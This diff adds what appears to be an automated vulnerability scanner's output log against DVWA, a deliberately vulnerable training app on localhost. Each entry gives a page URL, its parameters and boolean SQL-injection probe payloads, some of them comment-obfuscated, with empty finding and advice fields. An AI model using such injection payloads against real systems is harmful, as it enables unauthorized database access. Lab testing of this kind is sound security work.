@@ -1,0 +1,72 @@
+Target: http://localhost/dvwa/ (GET)
+
+---
+URL:http://localhost/dvwa/vulnerabilities/brute/ (POST)
+VulnName: 
+Query: {'username': 'cntvalue', 'user_token': '1417c229090078f00920f6842ef01bef', 'Login': 'Login', 'password': 'cntvalue'}
+Payload: '+and+'92552'='92552
+'+and+'33885'='33885
+'+or+90998=90998#
+'+and+'24595'='24596
+Advice: 
+---
+---
+URL:http://localhost/dvwa/vulnerabilities/xss_r/ (GET)
+VulnName: 
+Query: {'user_token': '29c78ebf39555442d4c9e1dc4d04decb', 'name': 'cntvalue'}
+Payload: '+and+'92552'='92552
+'+and+'33885'='33885
+'+or+90998=90998#
+'+and+'24595'='24596
+Advice: 
+---
+---
+URL:http://localhost/dvwa/vulnerabilities/sqli_blind/ (GET)
+VulnName: 
+Query: {'user_token': '44b1788c8a96fb978337f6b97ca463ea', 'id': 'cntvalue', 'Submit': 'Submit'}
+Payload: +and+62804=62804
++and+16146=16146
++or+61449=61449#
++and+62479=62480
+Advice: 
+---
+---
+URL:http://localhost/dvwa/vulnerabilities/sqli/ (GET)
+VulnName: 
+Query: {'user_token': '5f6b0fe60c0401c9240c81e2008670ac', 'id': 'cntvalue', 'Submit': 'Submit'}
+Payload: "+and+"62070"="62070
+"+and+"79566"="79566
+"+or+58919=58919#
+"+and+"71122"="71123
+Advice: 
+---
+---
+URL:http://localhost/dvwa/vulnerabilities/csrf/ (GET)
+VulnName: 
+Query: {'password_new': 'cntvalue', 'password_current': 'cntvalue', 'password_conf': 'cntvalue', 'Change': 'Change', 'user_token': 'ad2c861b43467c72617c290508ae388c'}
+Payload: "+and+"62070"="62070
+"+and+"79566"="79566
+"+or+58919=58919#
+"+and+"71122"="71123
+Advice: 
+---
+---
+URL:http://localhost/dvwa/setup.php (POST)
+VulnName: 
+Query: {'user_token': 'cad823c72ef0265a5f7051d012495a46', 'create_db': 'Create / Reset Database'}
+Payload: '/**/and/**/'85553'='85553
+'/**/and/**/'32254'='32254
+'/**/or/**/46768=46768#
+'/**/and/**/'21611'='21612
+Advice: 
+---
+---
+URL:http://localhost/dvwa/vulnerabilities/exec/ (POST)
+VulnName: 
+Query: {'ip': 'cntvalue', 'Submit': 'Submit', 'user_token': 'bcb43d15fc4d753871dc4a6aa5071ca9'}
+Payload: '/**/and/**/'85553'='85553
+'/**/and/**/'32254'='32254
+'/**/or/**/46768=46768#
+'/**/and/**/'21611'='21612
+Advice: 
+---
